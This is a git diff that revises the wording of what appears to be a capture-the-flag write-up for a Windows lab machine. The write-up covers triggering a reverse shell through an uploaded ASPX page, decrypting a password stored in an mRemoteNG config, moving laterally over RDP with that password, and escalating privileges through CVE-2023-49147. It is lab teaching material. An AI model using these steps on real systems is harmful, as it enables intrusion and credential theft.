+      "self": "http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/reverse.aspx?ref=main",
       "git": "http://localhost:3000/api/v1/repos/ellen.freeman/website/git/blobs/8ff8b12f86e41375bcf0cc5424f20452a1b1a1f8",
-      "html": "http://localhost:3000/ellen.freeman/website/src/branch/main/reverse-shell.aspx"
+      "html": "http://localhost:3000/ellen.freeman/website/src/branch/main/reverse.aspx"
     }
   },
   "commit": {
@@ -993,7 +993,7 @@ Finally, we paste it in the content file of our request:
 
 <br />
 
-Now, we start a listener and navigate to `http://10.129.29.102/reverse-shell.aspx` to trigger the reverse shell:
+Now, we start a listener and navigate to `http://10.129.29.102/reverse.aspx` to trigger the reverse shell:
 
 <br />
 
@@ -1015,7 +1015,7 @@ Lock
 
 <br />
 
-A reverse conection from the user `ellen.freeman` was sucessfully received.
+A reverse connection as the `ellen.freeman` user was sucessfully received.
 
 <br />
 
@@ -1023,7 +1023,7 @@ A reverse conection from the user `ellen.freeman` was sucessfully received.
 
 <br />
 
-After a while enumerating the system, we discovered a `config.xml` file inside the directory: `C:\Users\ellen.freeman\Documents`
+After enumerating the system for a while, we discover a `config.xml` file inside the directory: `C:\Users\ellen.freeman\Documents`
 
 <br />
 
@@ -1038,15 +1038,15 @@ type config.xml
 
 <br />
 
-This file is a `mRemoteNG` connection configuration file. In this file, we can find a user and a encrypted password:
+This file is a `mRemoteNG` connection configuration file. In this file, we can find a username and a encrypted password:
 
-- `User`: gare.dekarios 
+- `Username`: gale.dekarios 
 
 - `Password`: TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==
 
 <br />
 
-This type of passwords are really easy to crack, this happens because encryption method is weak. To decrypt it we will use a script from the following [GitHub repository](https://raw.githubusercontent.com/kmahyyg/mremoteng-decrypt/refs/heads/master/mremoteng_decrypt.py):
+These passwords are relatively easy to decrypt due to the weak encryption method used. To decrypt it, we use a script from the following [GitHub repository](https://raw.githubusercontent.com/kmahyyg/mremoteng-decrypt/refs/heads/master/mremoteng_decrypt.py):
 
 <br />
 
@@ -1057,9 +1057,9 @@ Password: ty8wnW9qCKDosXo6
 
 <br/>
 
-Plaintext password: `ty8wnW9qCKDosXo6`
+Decrypted password: `ty8wnW9qCKDosXo6`
 
-This password is valid to move laterally to the `gale.dekarios` account, NetExec confirmed it:
+These credentials are valid, allowing us to move laterally to the `gale.dekarios` account:
 
 <br />
 
@@ -1071,13 +1071,13 @@ RDP         10.129.29.102   3389   LOCK             [+] Lock\gale.dekarios:ty8wn
 
 <br />
 
-The RDP service is working so we will take advantage from it, these type of sessions are really good to increment our posibilities to find a way to elevate privileges, because we can access both a graphical interface and the terminal.
+The RDP service is working so we can leverage it, this type of session is really good to increase our chances to find a way to elevate privileges, because we can access both a graphical interface and the terminal.
 
-To connect we will use `xfreerdp` indicating a drive for our linux machine to have the possibility of share resources if we need it 
+To connect we will use `xfreerdp` indicating a drive for our linux machine to share resources between our local machine and the target if needed. 
 
 <br />
 
-⚠️ Note: (Modify the drive path to your own directory).
+⚠️ Note: Update the drive path to match your local directory.
 
 ```bash
 xfreerdp /v:10.129.29.102 /u:gale.dekarios /p:'ty8wnW9qCKDosXo6' /cert:ignore /drive:Shared,/home/theredp4nther
@@ -1089,7 +1089,7 @@ xfreerdp /v:10.129.29.102 /u:gale.dekarios /p:'ty8wnW9qCKDosXo6' /cert:ignore /d
 
 <br />
 
-The `user.txt` flag was retrieved.
+We can now retrieve the `user.txt` flag.
 
 <br />
 
@@ -1121,11 +1121,11 @@ This version is vulnerable to [CVE-2023-49147](https://nvd.nist.gov/vuln/detail/
 
 <br />
 
-To exploit this we will follow step by step the awesome POC of the following [website](https://sec-consult.com/blog/detail/msi-installer-repair-to-system-a-detailed-journey/) adapted to our scenario.
+To exploit this vulnerability, we follow step by step the excellent proof of concept of the following [website](https://sec-consult.com/blog/detail/msi-installer-repair-to-system-a-detailed-journey/) adapted to our scenario.
 
 <br />
 
-### Step 1 - Set a OpLock in the log file.
+### Step 1 - Set an OpLock in the log file.
 
 <br />
 
@@ -1203,7 +1203,7 @@ Press Ctrl+O in Firefox, then type cmd.exe in the top bar and click ENTER.
 
 <br />
 
-A cmd.exe with elevated privileged spawned:
+An elevated cmd.exe process is spawned:
 
 <br />
 
